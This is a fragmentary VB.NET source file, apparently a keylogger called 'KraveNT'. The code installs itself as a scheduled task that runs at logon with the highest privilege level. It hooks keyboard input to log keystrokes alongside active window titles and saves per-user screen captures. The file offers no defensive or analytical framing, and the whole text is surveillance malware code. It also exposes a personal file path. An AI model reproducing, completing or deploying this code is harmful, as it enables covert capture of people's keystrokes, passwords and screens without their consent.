...
#Region " GPO Security Identifier | Creators Owner ID, (Highest Mandatory Level) | Schedule Task  "
    ...
    Private Sub SubContractors()
        ...
        AddHandler subw.DoWork, Sub(sender1 As Object, e1 As DoWorkEventArgs)
                                    While True
                                        Try
                                            If CH() Then
                                                If Not GPO("c:\windows\system32\cmd.exe", "/C schtasks /create /rl HIGHEST /sc ONLOGON /tn KraveNT /F /tr """"" & Process.GetCurrentProcess.MainModule.FileName & """""").Contains("successfully") Then
    ...
    Private Sub SoilWork()
        ...
        With p.StartInfo
            ...
            .Arguments = ("/C schtasks /create /rl HIGHEST /sc ONLOGON /tn KraveNT /F /tr """"" & Process.GetCurrentProcess.MainModule.FileName & """""").Contains("successfully")
        ...
        If nCode >= 0 _
           AndAlso wParam = CType(WM_KEYDOWN, IntPtr) Then
            ...
            If capsLock OrElse shiftPress Then
                ...
                Dim captureSavePath As String = $"{savePath }\KraveNT\{userName }\capture_{dateString }.png"
            ...
            End If
            On Error GoTo Err
            Dim fileName As String = "C:\Users\rytho\OneDrive - University of Maine System\Documents\KraveNT.txt"
            Using writer As New StreamWriter(fileName,
                                             True)
                If CurrentActiveWindowTitle _
                   = GetActiveWindowTitle() Then
                    writer.Write(vbCrLf & "KraveNT Log Entry:")
